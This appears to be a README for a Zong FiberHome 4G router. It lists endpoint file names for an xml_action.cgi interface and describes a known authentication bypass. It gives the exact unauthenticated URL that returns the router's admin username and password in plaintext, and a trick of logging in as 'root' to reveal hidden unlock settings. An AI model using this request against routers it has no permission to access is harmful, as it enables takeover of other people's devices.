
# Zong FiberHome 4G Device

## Endpoints

Base URL: `/xml_action.cgi?method=get&module=duster&file=[name]`
known file names are:
 - admin
 - app_fun_support_list
 - battery_charge
 - custom_fw
 - detailed_log
 - dns
 - download_local_upgrade
 - lan
 - lock_cell_clear
 - message
 - message_drafts
 - message_outbox
 - message_set
 - message_state
 - message_state
 - net_advace_set
 - ntp_server
 - pin_puk
 - reset
 - restore_defaults
 - shutdown
 - status1
 - time_setting
 - traffic_excess_set
 - uapxb_wlan_basic_settings
 - uapxb_wlan_security_settings
 - upgrade_info
 - ussd_business
 - wan
 - wan_choose_net
 - wan_ip
 - wlan_auto_setting

 ## Vulnerabilities and Exploits
 Although the device use a wierd authentication method, it is nothing more than a gimmick used 
 by the UI code to give an illusion of authentication.
 All the endpoints are accessible directly without authentication and the best part of it all is you can
 use the [`admin`](http://192.168.8.1/xml_action.cgi?method=get&module=duster&file=admin) endpoint to get the username and password for the router.

The output of the `admin` endpoint is something like
```
<?xml version="1.0" encoding="US-ASCII"?>
<RGW>
	<management>
		<router_username>admin</router_username>
		<router_password>admin</router_password>
		<web_wlan_enable/>
		<httpd_port/>
		<syslogd_enable/>
		<web_wan_enable/>
		<syslogd_rem_ip/>
		<turbo_mode/>
        <customer/>
	</management>
</RGW>
```

The vulerability explained above is [well know and quite old](https://github.com/OsamaMahmood/Zong-router-exploit) but wait, There's more! to my knowledge(not sure though) the `Fiber Home` version of the `Zong` devices are unlocked by default but if yours is not, you can use a simple trick to get super user access and unlock
the device direcltly from the `Admin Panel` all you have to do is login to your router and change the default **username** from `admin` to `root` and voila you can see a new tab named `Advance` in `Settings` which provides options to unlock the device, As shown below

![Advance Settings](/zong_adv_settings.PNG?raw=true "Advance Settings")